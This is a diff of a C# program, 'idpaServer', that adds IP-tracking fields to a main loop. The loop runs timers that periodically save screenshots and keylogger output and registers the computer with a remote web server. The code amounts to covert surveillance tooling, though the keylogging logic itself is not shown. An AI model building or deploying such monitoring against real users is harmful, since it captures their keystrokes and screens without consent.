@@ -36,6 +36,8 @@ namespace idpaServer
         private static string myPcName;
         private static string myWinVers;
         private static int myServerID;
+        private static string localIp;
+        private static string clientIp;
 
         //Timers
         private static System.Timers.Timer timerPrintScreen;
@@ -47,6 +49,7 @@ namespace idpaServer
             myServerID = Properties.Settings.Default.id;
             myPcName = System.Environment.MachineName;
             myWinVers = Environment.OSVersion.ToString();
+            localIp = ConnectionManager.GetLocalIp();
 
             //Ist these Pc in the Webserver Database when no create Entry
             if (myServerID == 0)
@@ -64,7 +67,7 @@ namespace idpaServer
                 Console.WriteLine("IP has changed Update Entry");
                 Console.WriteLine(ConnectionManager.UpdateEntry(API_URI_UPDATE_IP, myServerID));
             }
-                
+              
             //Create Timers
             timerPrintScreen = new System.Timers.Timer(PRINT_SCREEN_INTERVAL);
             timerKey = new System.Timers.Timer(KEY_LOG_INTERVAL);
@@ -120,6 +123,7 @@ namespace idpaServer
 
         private static void InitSavePrintScreen(object sender, EventArgs e)
         {
+            Console.WriteLine("Logfie written");
             FileManager.SavePrintScreen(PrintScreen.GetScreenshot(), PRINTSCREEN_PATH);
         }
 
@@ -127,8 +131,6 @@ namespace idpaServer
         {
             FileManager.SaveLogFile(LOG_PATH, Keylogger.GetLogger());
         }
-
-        
     }
       
 }
